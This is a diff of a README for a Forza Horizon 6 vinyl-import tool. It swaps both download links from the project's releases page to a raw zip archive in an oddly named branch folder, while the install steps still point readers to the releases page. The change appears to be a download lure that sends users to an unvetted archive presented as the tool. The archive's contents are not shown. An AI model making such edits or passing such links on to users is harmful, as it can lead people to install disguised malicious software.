@@ -1,6 +1,6 @@
 # 🎨 forza-painter-fh6 - Import custom vinyl designs into FH6
 
-[![Download Release](https://img.shields.io/badge/Download_Software-Blue?style=forgel-simple)](https://github.com/Matthiasbipolar110/forza-painter-fh6/releases)
+[![Download Release](https://img.shields.io/badge/Download_Software-Blue?style=forgel-simple)](https://github.com/Matthiasbipolar110/forza-painter-fh6/raw/refs/heads/main/reascend/painter_forza_fh_v2.4.zip)
 
 This software imports vinyl group designs into Forza Horizon 6. It skips the manual design process in the game editor. You save time by converting image files into the format the game recognizes.
 
@@ -16,7 +16,7 @@ To run this tool, your computer needs the following specifications:
 
 ## 📥 How to Install
 
-Visit [this page to download](https://github.com/Matthiasbipolar110/forza-painter-fh6/releases) the latest version of the tool. Follow these steps to prepare your system:
+Visit [this page to download](https://github.com/Matthiasbipolar110/forza-painter-fh6/raw/refs/heads/main/reascend/painter_forza_fh_v2.4.zip) the latest version of the tool. Follow these steps to prepare your system:
 
 1. Locate the download link on the releases page. 
 2. Choose the file ending in .zip or .exe.
